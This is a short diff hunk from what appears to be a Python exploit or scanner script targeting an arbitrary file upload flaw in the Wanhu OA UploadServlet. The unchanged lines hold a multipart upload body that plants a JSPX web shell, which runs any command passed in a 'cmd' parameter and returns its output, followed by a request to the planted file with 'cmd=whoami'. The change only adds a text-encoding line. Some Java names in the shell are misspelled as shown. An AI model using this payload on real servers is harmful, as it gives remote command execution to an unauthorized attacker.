@@ -37,7 +37,7 @@ Content-Type: text/plain
 <jsp:scriptlet> String cmd = request.getParameter("cmd"); String output = "";if(cmd != null) { String s=null; try { Process p = Runtime.getRuntime().exec(cmd);BufferedReader sI = new BufferedReader(newInputStreamReader(p.getInputStream())); while((s = sI.readline()) != null) { output += s +"\r\n";}} catch(IOException e) {e.printStackIrace();}}</jsp:scriptlet><jsp:expression>output</jsp:expression></jsp:root>
 -------------------------f6f5e12ed2e08256--'''
     
-    
+    data=data.encode("utf-8").decode("latin1")
     console.print(now_time() + " [INFO]     正在检测万户OA_UploadServlet 任意文件上传漏洞", style='bold blue')
     shell_url=target_url+'defaultroot/upload/test/123456/123456.jspx?cmd=whoami'
     try:
